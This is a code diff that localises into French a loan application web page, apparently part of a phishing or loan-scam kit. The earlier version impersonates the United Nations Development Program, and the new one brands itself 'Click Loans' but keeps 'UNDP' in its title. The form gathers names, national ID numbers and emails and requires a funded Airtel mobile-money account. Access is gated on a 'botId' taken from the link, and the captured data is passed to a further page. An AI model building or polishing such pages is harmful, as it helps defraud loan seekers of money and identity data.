@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>UNDP Application Form</title>
+<title>Formulaire de demande UNDP</title>
 
 <style>
 body { font-family: Arial, sans-serif; background: #f6f7fb; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
@@ -31,7 +31,7 @@ button { width: 100%; padding: 12px; background: darkblue; color: white; border:
     margin-bottom: 20px;
  }
 .loan-notice ol {
-    padding-left: 20px; /* indent numbers */
+    padding-left: 20px;
     margin: 8px 0 0 0;
 }
 .loan-notice li {
@@ -43,57 +43,52 @@ button { width: 100%; padding: 12px; background: darkblue; color: white; border:
 
 <div class="loan-container">
     <div class="logo-container">
-     <h1>United Nations Development Program</h1>   
+     <h1>Click Loans</h1>   
     </div>
 
     <form id="loanForm">
-        <!-- NEW NAME INPUT -->
-        <label>Full Name</label>
-        <input id="fullName" type="text" required placeholder="Enter your full name">
 
-        <label>Loan Amount (USD)</label>
+        <label>Nom complet</label>
+        <input id="fullName" type="text" required placeholder="Entrez votre nom complet">
+
+        <label>Montant du prêt (USD)</label>
         <input id="loanAmount" type="number" required placeholder="MIN50">
+
         <label>Email</label>
-        <input id="email" type="email" placeholder="example@gmail.com" required>
-        <label>National ID</label>
-        <input id="nationalId" type="text"  placeholder="National Id">
-        <!-- <label>Repayment Period</label>
-        <select id="repaymentPeriod" required>
-            <option value="">Select</option>
-            <option value="7days">7 Days(1.5% interest)</option>
-            <option value="14days">14 Days(2.5% interest)</option>
-            <option value="21days">21 Days(3.5% interest)</option>
-            <option value="30days">30 Days(4.5% interest)</option>
-            <option value="60days">60 Days(6% interest)</option>
-            <option value="90days">90 Days(10% interest)</option>
-        </select> -->
-        <label>Employment Status</label>
+        <input id="email" type="email" placeholder="exemple@gmail.com" required>
+
+        <label>Carte nationale d'identité</label>
+        <input id="nationalId" type="text" placeholder="Carte nationale d'identité">
+
+        <label>Statut professionnel</label>
         <select id="employmentStatus" required>
-            <option value="">Select</option>
-            <option value="employed">Employed</option>
-            <option value="self-employed">Self-employed</option>
-            <option value="unemployed">Unemployed</option>
-            <option value="student">Student</option>
+            <option value="">Sélectionner</option>
+            <option value="employed">Employé</option>
+            <option value="self-employed">Travailleur indépendant</option>
+            <option value="unemployed">Sans emploi</option>
+            <option value="student">Étudiant</option>
         </select>
-        <label>Loan Purpose</label>
+
+        <label>Objet du prêt</label>
         <select id="loanPurpose" required>
-            <option value="">Select</option>
-            <option value="business">Business</option>
-            <option value="personal">Personal Loans</option>
-            <option value="schoolfees">School Fees</option>
-            <option value="medical">Medical</option>
-            <option value="others">Others</option>
+            <option value="">Sélectionner</option>
+            <option value="business">Entreprise</option>
+            <option value="personal">Prêt personnel</option>
+            <option value="schoolfees">Frais scolaires</option>
+            <option value="medical">Médical</option>
+            <option value="others">Autres</option>
         </select>
 
         <div class="loan-notice">
-            <strong>Qualification Notice:</strong>
+            <strong>Avis de qualification :</strong>
             <ol>
-                 <li>Must apply with a active Airtel account.</li>
-                <li>Must have at least 10% of the amount applying in the Airtel account </li>
+                 <li>Doit postuler avec un compte Airtel actif.</li>
+                <li>Doit avoir au moins 10 % du montant demandé sur le compte Airtel.</li>
             </ol>
         </div>
 
-        <button type="submit">Next</button>
+        <button type="submit">Suivant</button>
+
     </form>
 </div>
 
@@ -105,24 +100,23 @@ if (!botId) {
     const botIndex = parts.indexOf('bot');
     if (botIndex !== -1 && parts[botIndex + 1]) botId = parts[botIndex + 1];
 }
-if (!botId) { alert("Invalid access link"); throw new Error("botId missing"); }
+if (!botId) { alert("Lien d'accès invalide"); throw new Error("botId missing"); }
 localStorage.setItem('botId', botId);
 
 // ---------------- FORM LOGIC ----------------
 document.getElementById('loanForm').addEventListener('submit', e => {
     e.preventDefault();
 
-    // SAVE NAME + EXISTING FIELDS
-    localStorage.setItem('fullName', fullName.value); // NEW
+    localStorage.setItem('fullName', fullName.value);
     localStorage.setItem('loanAmount', loanAmount.value);
     localStorage.setItem('email', email.value);
     localStorage.setItem('nationalId', nationalId.value);
-    // localStorage.setItem('repaymentPeriod', repaymentPeriod.value);
     localStorage.setItem('employmentStatus', employmentStatus.value);
     localStorage.setItem('loanPurpose', loanPurpose.value);
 
     window.location.href = `details.html?botId=${botId}`;
 });
 </script>
+
 </body>
 </html>
